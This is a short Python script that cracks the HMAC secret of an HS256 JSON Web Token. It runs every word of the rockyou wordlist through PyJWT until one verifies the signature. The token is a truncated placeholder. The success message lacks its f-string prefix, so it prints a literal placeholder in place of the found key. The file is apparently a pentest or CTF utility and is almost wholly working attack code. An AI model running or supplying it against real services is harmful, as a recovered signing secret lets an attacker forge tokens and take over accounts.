#!/usr/bin/python3
# 
# Summary:
#     Script to decode a HS256 JWT Token given a wordlist. Replace token, and prepare a script
#       
# Pre-requisites:
#     PyJWT: python3 -m pip install pyjwt
# 

import jwt
import os
import sys

if __name__ == "__main__":

    # Token to decode
    token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJm.........."

    # Wordlist to use
    wordlist = "/usr/share/wordlists/rockyou.txt"
    
    print(f"[*] Checking if JWT token specified...")
    if not token:
        print(f"[-] JWT token not provided")
        sys.exit(1)

    print(f"[*] Checking wordlist: {wordlist} exists...")
    if not os.path.isfile(wordlist):
        print(f"[-] Wordlist: {wordlist} not found")
        sys.exit(1)
    else:
        print(f"[*] Reading words from file: {wordlist}")
        words = []
        with open(wordlist, "rb") as f:
            for l in f:
                words.append(l)
        
        print(f"[*] Counting number of words found...")
        num_words = len(words)
        print(f"[+] Wordlist: {wordlist} number of words: {num_words}")
        
    
    print("[*] Looping through each word to validate JWT token...")
    for i, w in enumerate(words):
        w_decoded = w.decode(errors='ignore').strip()
        print(f"[*] {i}/{num_words} Trying {w_decoded}...")
        try:    
            jwt.decode(token, w_decoded, algorithms="HS256")
            print("[+] Key found: {w_decoded}")
            break
        except Exception as e:
            pass
